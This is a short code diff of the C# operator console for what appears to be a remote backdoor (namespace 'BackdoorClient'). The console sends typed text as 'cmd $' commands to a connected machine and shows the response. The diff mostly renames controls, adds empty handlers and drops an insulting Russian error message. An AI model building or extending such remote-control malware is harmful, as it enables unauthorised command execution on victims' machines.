@@ -24,20 +24,23 @@ namespace BackdoorClient
         {
             if (!mainForm.TestConnect())
             {
-                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 this.Close();
                 return;
             }
+            //commandTextBox.KeyDown += new KeyPressEventHandler(EnterCommandText(this, new KeyPressEventArgs('s')));
         }
+        private void EnterCommandText(object sender,KeyEventHandler e)
+        {
 
+        }
         private void sendButton_Click(object sender, EventArgs e)
         {
-            responseText.Text += "\n " + mainForm.SendCommandAndGetResponce("cmd $" + commandTextBox.Text);
+            consoleText.Text += "\n " + mainForm.SendCommandAndGetResponce("cmd $" + commandTextBox.Text);
         }
 
-        private void vScrollBar1_Scroll(object sender, ScrollEventArgs e)
+        private void commandTextBox_TextChanged(object sender, EventArgs e)
         {
-            responseText.Location =  new Point(new Size(12, -vScrollBar1.Value + 10));
+
         }
     }
 }
